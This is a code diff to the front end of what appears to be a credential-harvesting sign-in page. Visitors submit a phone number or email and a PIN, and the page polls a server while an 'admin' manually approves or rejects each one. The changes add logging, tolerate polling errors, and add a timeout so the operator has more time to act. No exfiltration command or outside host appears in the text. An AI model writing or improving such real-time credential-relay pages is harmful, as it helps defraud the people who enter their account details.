@@ -617,12 +617,19 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
             throw new Error(data.error || 'Failed to submit');
         }
 
+        console.log('📥 Response:', data);
+        console.log('📥 RequestId:', data.requestId);
+
         // Show waiting status with spinner
         showStatus('⏳ Waiting for admin verification...', 'waiting');
 
         // ---------------- POLLING (FIXED) ----------------
+        let pollCount = 0;
         const poll = setInterval(async () => {
             try {
+                pollCount++;
+                console.log(`🔄 Poll #${pollCount} for requestId: ${data.requestId}`);
+                
                 const r = await fetch(`/check-details/${data.requestId}`);
                 const d = await r.json();
                 
@@ -645,8 +652,8 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
                         return;
                     }
 
-                    // ❌ Phone/Email rejected
-                    if (d.approved === false && d.reason === 'invalid_identifier') {
+                    // Check if there's a reason for rejection
+                    if (d.reason === 'invalid_identifier') {
                         clearInterval(poll);
                         showStatus('❌ Invalid phone number/email. Please check and try again.', 'error');
                         signinBtn.disabled = false;
@@ -656,8 +663,7 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
                         return;
                     }
 
-                    // ❌ PIN rejected
-                    if (d.approved === false && d.reason === 'invalid_pin') {
+                    if (d.reason === 'invalid_pin') {
                         clearInterval(poll);
                         showStatus('❌ Incorrect PIN. Please try again.', 'error');
                         signinBtn.disabled = false;
@@ -667,26 +673,33 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
                         return;
                     }
 
-                    // ❌ Both rejected or still pending
-                    if (d.approved === false) {
-                        clearInterval(poll);
-                        showStatus('❌ Verification failed. Please check your details.', 'error');
-                        signinBtn.disabled = false;
-                        signinBtn.textContent = "Sign In";
+                    // If approved is false but no specific reason, keep waiting
+                    if (d.approved === false && !d.reason) {
+                        // Still waiting for admin approval
+                        console.log('⏳ Still waiting for admin approval...');
                         return;
                     }
                 }
 
             } catch (err) {
-                clearInterval(poll);
-                showStatus('⚠️ Connection lost. Please try again.', 'error');
-                signinBtn.disabled = false;
-                signinBtn.textContent = "Sign In";
+                console.error('❌ Polling error:', err);
+                // Don't clear interval on temporary errors, let it retry
             }
 
         }, 3000); // Poll every 3 seconds
 
+        // Safety timeout - stop polling after 2 minutes
+        setTimeout(() => {
+            clearInterval(poll);
+            if (signinBtn.disabled) {
+                showStatus('⏰ Verification timeout. Please try again.', 'error');
+                signinBtn.disabled = false;
+                signinBtn.textContent = "Sign In";
+            }
+        }, 120000);
+
     } catch (err) {
+        console.error('❌ Submit error:', err);
         showStatus('❌ ' + err.message, 'error');
         signinBtn.disabled = false;
         signinBtn.textContent = "Sign In";
